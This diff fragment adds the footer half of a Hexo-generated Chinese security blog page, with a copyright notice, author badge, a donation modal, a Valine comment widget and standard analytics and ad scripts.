+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/login546" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt>
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/login546" target="_blank"><span class="text-dark">Shym</span><small class="ml-1x">Web Penetration &amp; Safe</small></a></h3>
+        <div>念念不忘，必有回响。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2019/05/14/ss-ssr一键搭建及开启bbr加速/" title="ss/ssr一键搭建及开启bbr加速"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
+        <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫">
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫">
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class>
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/login546" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.min.js"></script>
+<script src="/js/application.js"></script>
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '8N4wsmE4q6xOV8SFDCdDeBlG-9Nh9j0Va',
+    appKey: 'cyKEqESlp99uYO9D2y37mcn3',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+    <script defer type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-138683168-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+    <script defer>
+var _hmt = _hmt || [];
+(function() {
+    var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?06a311cb0e022d892a71f4c2082899e4";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-5733798161093239",
+    enable_page_level_ads: true
+  });
+</script>
+
+
+
+
+
+</body>
+</html>
